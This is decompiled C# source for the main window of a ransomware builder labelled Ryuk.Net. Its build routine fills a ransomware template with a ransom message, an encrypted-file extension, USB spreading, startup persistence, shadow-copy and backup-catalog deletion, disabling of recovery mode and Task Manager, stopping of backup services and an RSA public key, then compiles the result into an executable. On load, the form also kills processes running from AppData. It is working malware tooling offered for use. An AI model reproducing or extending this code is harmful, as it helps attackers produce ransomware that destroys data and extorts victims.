using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Ryuk.Net;
using Ryuk.Net.Properties;

namespace CustomWindowsForm
{
	// Token: 0x02000003 RID: 3
	public partial class BlackForm : Form
	{
		// Token: 0x0600001F RID: 31 RVA: 0x00003CE8 File Offset: 0x00001EE8
		public BlackForm()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003D74 File Offset: 0x00001F74
		private void BlackForm_Load(object sender, EventArgs e)
		{
			this.setValue();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.MainModule.FileName.Contains(folderPath))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003DF8 File Offset: 0x00001FF8
		private bool setValue()
		{
			bool result;
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + this.forMutex))
				{
					registryKey.SetValue(this.forMutex, this.forMutex);
					registryKey.Close();
					result = true;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003E78 File Offset: 0x00002078
		private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isTopBorderPanelDragged = true;
			}
			else
			{
				this.isTopBorderPanelDragged = false;
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x00003EB0 File Offset: 0x000020B0
		private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Y < base.Location.Y)
			{
				if (this.isTopBorderPanelDragged)
				{
					if (base.Height < 50)
					{
						base.Height = 50;
						this.isTopBorderPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
					}
				}
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00003F56 File Offset: 0x00002156
		private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isTopBorderPanelDragged = false;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00003F60 File Offset: 0x00002160
		private void TopPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isTopPanelDragged = true;
				Point point = base.PointToScreen(new Point(e.X, e.Y));
				this.offset = default(Point);
				this.offset.X = base.Location.X - point.X;
				this.offset.Y = base.Location.Y - point.Y;
			}
			else
			{
				this.isTopPanelDragged = false;
			}
			if (e.Clicks == 2)
			{
				this.isTopPanelDragged = false;
				this._MaxButton_Click(sender, e);
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00004020 File Offset: 0x00002220
		private void TopPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isTopPanelDragged)
			{
				Point location = this.TopPanel.PointToScreen(new Point(e.X, e.Y));
				location.Offset(this.offset);
				base.Location = location;
				if (base.Location.X > 2 || base.Location.Y > 2)
				{
					if (base.WindowState == FormWindowState.Maximized)
					{
						base.Location = this._normalWindowLocation;
						base.Size = this._normalWindowSize;
						this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
						this.isWindowMaximized = false;
					}
				}
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000040E4 File Offset: 0x000022E4
		private void TopPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isTopPanelDragged = false;
			if (base.Location.Y <= 5)
			{
				if (!this.isWindowMaximized)
				{
					this._normalWindowSize = base.Size;
					this._normalWindowLocation = base.Location;
					Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
					base.Location = new Point(0, 0);
					base.Size = new Size(workingArea.Width, workingArea.Height);
					this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
					this.isWindowMaximized = true;
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x0000417C File Offset: 0x0000237C
		private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (base.Location.X <= 0 || e.X < 0)
			{
				this.isLeftPanelDragged = false;
				base.Location = new Point(10, base.Location.Y);
			}
			else if (e.Button == MouseButtons.Left)
			{
				this.isLeftPanelDragged = true;
			}
			else
			{
				this.isLeftPanelDragged = false;
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00004200 File Offset: 0x00002400
		private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X)
			{
				if (this.isLeftPanelDragged)
				{
					if (base.Width < 100)
					{
						base.Width = 100;
						this.isLeftPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
					}
				}
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000042A6 File Offset: 0x000024A6
		private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftPanelDragged = false;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x000042B0 File Offset: 0x000024B0
		private void RightPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isRightPanelDragged = true;
			}
			else
			{
				this.isRightPanelDragged = false;
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x000042E8 File Offset: 0x000024E8
		private void RightPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isRightPanelDragged)
			{
				if (base.Width < 100)
				{
					base.Width = 100;
					this.isRightPanelDragged = false;
				}
				else
				{
					base.Width += e.X;
				}
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00004340 File Offset: 0x00002540
		private void RightPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightPanelDragged = false;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x0000434C File Offset: 0x0000254C
		private void BottomPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				this.isBottomPanelDragged = true;
			}
			else
			{
				this.isBottomPanelDragged = false;
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00004384 File Offset: 0x00002584
		private void BottomPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isBottomPanelDragged)
			{
				if (base.Height < 50)
				{
					base.Height = 50;
					this.isBottomPanelDragged = false;
				}
				else
				{
					base.Height += e.Y;
				}
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x000043DC File Offset: 0x000025DC
		private void BottomPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.isBottomPanelDragged = false;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000043E6 File Offset: 0x000025E6
		private void _MinButton_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000043F4 File Offset: 0x000025F4
		private void _MaxButton_Click(object sender, EventArgs e)
		{
			if (this.isWindowMaximized)
			{
				base.Location = this._normalWindowLocation;
				base.Size = this._normalWindowSize;
				this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
				this.isWindowMaximized = false;
			}
			else
			{
				this._normalWindowSize = base.Size;
				this._normalWindowLocation = base.Location;
				Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
				base.Location = new Point(0, 0);
				base.Size = new Size(workingArea.Width, workingArea.Height);
				this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
				this.isWindowMaximized = true;
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000044A2 File Offset: 0x000026A2
		private void _CloseButton_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000044AC File Offset: 0x000026AC
		private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isRightBottomPanelDragged = true;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x000044B8 File Offset: 0x000026B8
		private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.isRightBottomPanelDragged)
			{
				if (base.Width < 100 || base.Height < 50)
				{
					base.Width = 100;
					base.Height = 50;
					this.isRightBottomPanelDragged = false;
				}
				else
				{
					base.Width += e.X;
					base.Height += e.Y;
				}
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x0000453B File Offset: 0x0000273B
		private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightBottomPanelDragged = false;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00004545 File Offset: 0x00002745
		private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00004551 File Offset: 0x00002751
		private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000039 RID: 57 RVA: 0x0000455D File Offset: 0x0000275D
		private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.RightBottomPanel_1_MouseUp(sender, e);
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00004569 File Offset: 0x00002769
		private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isLeftBottomPanelDragged = true;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00004574 File Offset: 0x00002774
		private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X)
			{
				if (this.isLeftBottomPanelDragged || base.Height < 50)
				{
					if (base.Width < 100)
					{
						base.Width = 100;
						base.Height = 50;
						this.isLeftBottomPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
						base.Height += e.Y;
					}
				}
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x0000464D File Offset: 0x0000284D
		private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftBottomPanelDragged = false;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00004657 File Offset: 0x00002857
		private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseDown(sender, e);
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00004663 File Offset: 0x00002863
		private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseMove(sender, e);
		}

		// Token: 0x0600003F RID: 63 RVA: 0x0000466F File Offset: 0x0000286F
		private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.LeftBottomPanel_1_MouseUp(sender, e);
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000467B File Offset: 0x0000287B
		private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isRightTopPanelDragged = true;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004688 File Offset: 0x00002888
		private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Y < base.Location.Y || e.X < base.Location.X)
			{
				if (this.isRightTopPanelDragged)
				{
					if (base.Height < 50 || base.Width < 100)
					{
						base.Height = 50;
						base.Width = 100;
						this.isRightTopPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
						base.Width += e.X;
					}
				}
			}
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00004779 File Offset: 0x00002979
		private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isRightTopPanelDragged = false;
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00004783 File Offset: 0x00002983
		private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseDown(sender, e);
		}

		// Token: 0x06000044 RID: 68 RVA: 0x0000478F File Offset: 0x0000298F
		private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseMove(sender, e);
		}

		// Token: 0x06000045 RID: 69 RVA: 0x0000479B File Offset: 0x0000299B
		private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.RightTopPanel_1_MouseUp(sender, e);
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000047A7 File Offset: 0x000029A7
		private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
		{
			this.isLeftTopPanelDragged = true;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000047B4 File Offset: 0x000029B4
		private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.X < base.Location.X || e.Y < base.Location.Y)
			{
				if (this.isLeftTopPanelDragged)
				{
					if (base.Width < 100 || base.Height < 50)
					{
						base.Width = 100;
						base.Height = 100;
						this.isLeftTopPanelDragged = false;
					}
					else
					{
						base.Location = new Point(base.Location.X + e.X, base.Location.Y);
						base.Width -= e.X;
						base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
						base.Height -= e.Y;
					}
				}
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000048D7 File Offset: 0x00002AD7
		private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
		{
			this.isLeftTopPanelDragged = false;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000048E1 File Offset: 0x00002AE1
		private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseDown(sender, e);
		}

		// Token: 0x0600004A RID: 74 RVA: 0x000048ED File Offset: 0x00002AED
		private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseMove(sender, e);
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000048F9 File Offset: 0x00002AF9
		private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
		{
			this.LeftTopPanel_1_MouseUp(sender, e);
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00004905 File Offset: 0x00002B05
		private void file_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00004908 File Offset: 0x00002B08
		private void edit_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004E RID: 78 RVA: 0x0000490B File Offset: 0x00002B0B
		private void view_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600004F RID: 79 RVA: 0x0000490E File Offset: 0x00002B0E
		private void run_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00004911 File Offset: 0x00002B11
		private void help_button_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004914 File Offset: 0x00002B14
		private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseDown(sender, e);
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004920 File Offset: 0x00002B20
		private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseMove(sender, e);
		}

		// Token: 0x06000053 RID: 83 RVA: 0x0000492C File Offset: 0x00002B2C
		private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
		{
			this.TopPanel_MouseUp(sender, e);
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004938 File Offset: 0x00002B38
		private void shapedButton3_Click(object sender, EventArgs e)
		{
			Form2 form = new Form2();
			form.ShowDialog();
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00004954 File Offset: 0x00002B54
		private void shapedButton4_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Text.Trim().Length < 1)
			{
				MessageBox.Show("Please type your message!", "Read_it.txt", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else if (string.IsNullOrWhiteSpace("aa"))
			{
				MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < this.textBox1.Lines.Length; i++)
				{
					string str = this.textBox1.Lines[i].Replace("\"", "'");
					stringBuilder.Append("\"" + str + "\",\n");
				}
				string text = Resources.Source;
				text = text.Replace("#messages", stringBuilder.ToString());
				if (this.checkBox1.Checked)
				{
					text = text.Replace("#encryptedFileExtension", "");
				}
				else
				{
					string text2 = this.textBox2.Text;
					if (text2.Contains("."))
					{
						text2 = text2.Replace(".", "");
					}
					text = text.Replace("#encryptedFileExtension", text2);
				}
				if (this.checkBox2.Checked)
				{
					if (this.textBox4.Text.Trim().Length < 1)
					{
						MessageBox.Show("Proccess name field is empty");
						return;
					}
					if (this.textBox4.Text.EndsWith(".exe"))
					{
						text = text.Replace("#copyRoaming", "true");
						text = text.Replace("#exeName", this.textBox4.Text);
					}
					else
					{
						text = text.Replace("#copyRoaming", "true");
						text = text.Replace("#exeName", this.textBox4.Text + ".exe");
					}
				}
				else
				{
					text = text.Replace("#copyRoaming", "false");
					text = text.Replace("#exeName", this.textBox4.Text);
				}
				if (this.usbSpreadCheckBox.Checked)
				{
					if (this.spreadNameText.Text.Trim().Length < 1)
					{
						MessageBox.Show("Usb spread name field is empty");
						return;
					}
					if (this.spreadNameText.Text.EndsWith(".exe"))
					{
						text = text.Replace("#checkSpread", "true");
						text = text.Replace("#spreadName", this.spreadNameText.Text);
					}
					else
					{
						text = text.Replace("#checkSpread", "true");
						text = text.Replace("#spreadName", this.spreadNameText.Text + ".exe");
					}
				}
				else
				{
					text = text.Replace("#checkSpread", "false");
					text = text.Replace("#spreadName", this.spreadNameText.Text);
				}
				if (this.startupcheckBox3.Checked)
				{
					text = text.Replace("#startupFolder", "true");
				}
				else
				{
					text = text.Replace("#startupFolder", "true");
				}
				if (this.sleepCheckBox.Checked)
				{
					text = text.Replace("#checkSleep", "true");
					text = text.Replace("#sleepTextbox", this.SleepTextBox.Text);
				}
				else
				{
					text = text.Replace("#checkSleep", "false");
					text = text.Replace("#sleepTextbox", this.SleepTextBox.Text);
				}
				if (Settings.Default.checkAdminPrivilage)
				{
					text = text.Replace("#adminPrivilage", "true");
				}
				else
				{
					text = text.Replace("#adminPrivilage", "false");
				}
				if (Settings.Default.deleteBackupCatalog)
				{
					text = text.Replace("#checkdeleteBackupCatalog", "true");
				}
				else
				{
					text = text.Replace("#checkdeleteBackupCatalog", "false");
				}
				if (Settings.Default.deleteShadowCopies)
				{
					text = text.Replace("#checkdeleteShadowCopies", "true");
				}
				else
				{
					text = text.Replace("#checkdeleteShadowCopies", "false");
				}
				if (Settings.Default.disableRecoveryMode)
				{
					text = text.Replace("#checkdisableRecoveryMode", "true");
				}
				else
				{
					text = text.Replace("#checkdisableRecoveryMode", "false");
				}
				if (Settings.Default.disableTaskManager)
				{
					text = text.Replace("#checkdisableTaskManager", "true");
				}
				else
				{
					text = text.Replace("#checkdisableTaskManager", "false");
				}
				if (Settings.Default.stopBackupServices)
				{
					text = text.Replace("#checkStopBackupServices", "true");
				}
				else
				{
					text = text.Replace("#checkStopBackupServices", "false");
				}
				if (this.droppedMessageTextbox.Text.Trim().Length < 1)
				{
					MessageBox.Show("Dropped message name field is empty");
				}
				else
				{
					text = text.Replace("#droppedMessageTextbox", this.droppedMessageTextbox.Text);
					string publicKey = Settings.Default.publicKey;
					bool encryptOption = Settings.Default.encryptOption;
					if (encryptOption)
					{
						if (!(publicKey != ""))
						{
							MessageBox.Show("Decrypter name field is empty. Go to \"Decrypter & Options\" and create or select decrypter", "Advanced Option");
							return;
						}
						using (StringReader stringReader = new StringReader(publicKey))
						{
							StringBuilder stringBuilder2 = new StringBuilder();
							string text3;
							while ((text3 = stringReader.ReadLine()) != null)
							{
								string str2 = text3.Replace("\"", "\\\"");
								stringBuilder2.AppendLine("pubclicKey.AppendLine(\"" + str2 + "\");");
							}
							text = text.Replace("#encryptOption", "true");
							text = text.Replace("#publicKey", stringBuilder2.ToString());
						}
					}
					else
					{
						text = text.Replace("#encryptOption", "false");
						text = text.Replace("#publicKey", "");
					}
					if (Settings.Default.base64Image != "")
					{
						text = text.Replace("#base64Image", Settings.Default.base64Image);
					}
					if (Settings.Default.extensions != "")
					{
						text = text.Replace("#extensions", Settings.Default.extensions);
					}
					using (SaveFileDialog saveFileDialog = new SaveFileDialog())
					{
						saveFileDialog.Filter = "Executable (*.exe)|*.exe";
						if (saveFileDialog.ShowDialog() == DialogResult.OK)
						{
							new Compiler(text, saveFileDialog.FileName, this.iconLocation);
						}
					}
				}
			}
		}

		// Token: 0x06000056 RID: 86 RVA: 0x000050D8 File Offset: 0x000032D8
		private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
		{
		}

		// Token: 0x06000057 RID: 87 RVA: 0x000050DB File Offset: 0x000032DB
		private void panel2_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000050E0 File Offset: 0x000032E0
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.textBox2.Enabled)
			{
				this.textBox2.Enabled = true;
			}
			else
			{
				this.textBox2.Enabled = false;
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00005120 File Offset: 0x00003320
		private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.spreadNameText.Enabled)
			{
				this.spreadNameText.Enabled = true;
			}
			else
			{
				this.spreadNameText.Enabled = false;
			}
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00005160 File Offset: 0x00003360
		private void checkBox2_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.textBox4.Enabled)
			{
				this.textBox4.Enabled = true;
			}
			else
			{
				this.textBox4.Enabled = false;
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x0000519D File Offset: 0x0000339D
		private void button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600005C RID: 92 RVA: 0x000051A0 File Offset: 0x000033A0
		private void pictureBox1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icons (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconLocation = openFileDialog.FileName;
					this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
					this.selectIconLabel.Text = "";
				}
			}
		}

		// Token: 0x0600005D RID: 93 RVA: 0x00005240 File Offset: 0x00003440
		private void selectIconLabel_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icons (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.iconLocation = openFileDialog.FileName;
					this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(60, 60)).Handle);
					this.selectIconLabel.Text = "";
				}
			}
		}

		// Token: 0x0600005E RID: 94 RVA: 0x000052E0 File Offset: 0x000034E0
		private void checkBox3_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.SleepTextBox.Enabled)
			{
				this.SleepTextBox.Enabled = true;
			}
			else
			{
				this.SleepTextBox.Enabled = false;
			}
		}

		// Token: 0x0600005F RID: 95 RVA: 0x00005320 File Offset: 0x00003520
		private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
		{
			if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar))
			{
				e.Handled = true;
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00005358 File Offset: 0x00003558
		private void shapedButton1_Click(object sender, EventArgs e)
		{
			advancedSettingForm advancedSettingForm = new advancedSettingForm();
			advancedSettingForm.ShowDialog();
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00005373 File Offset: 0x00003573
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00005376 File Offset: 0x00003576
		private void textBox1_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00005379 File Offset: 0x00003579
		private void TopPanel_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000064 RID: 100 RVA: 0x0000537C File Offset: 0x0000357C
		private void shapedButton2_Click(object sender, EventArgs e)
		{
			extensions extensions = new extensions();
			extensions.ShowDialog();
		}

		// Token: 0x04000018 RID: 24
		private bool isTopPanelDragged = false;

		// Token: 0x04000019 RID: 25
		private bool isLeftPanelDragged = false;

		// Token: 0x0400001A RID: 26
		private bool isRightPanelDragged = false;

		// Token: 0x0400001B RID: 27
		private bool isBottomPanelDragged = false;

		// Token: 0x0400001C RID: 28
		private bool isTopBorderPanelDragged = false;

		// Token: 0x0400001D RID: 29
		private bool isRightBottomPanelDragged = false;

		// Token: 0x0400001E RID: 30
		private bool isLeftBottomPanelDragged = false;

		// Token: 0x0400001F RID: 31
		private bool isRightTopPanelDragged = false;

		// Token: 0x04000020 RID: 32
		private bool isLeftTopPanelDragged = false;

		// Token: 0x04000021 RID: 33
		private bool isWindowMaximized = false;

		// Token: 0x04000022 RID: 34
		private Point offset;

		// Token: 0x04000023 RID: 35
		private Size _normalWindowSize;

		// Token: 0x04000024 RID: 36
		private Point _normalWindowLocation = Point.Empty;

		// Token: 0x04000025 RID: 37
		private string iconLocation = "";

		// Token: 0x04000026 RID: 38
		private string forMutex = "oAnWieozQPsRK7Bj83r4";
	}
}
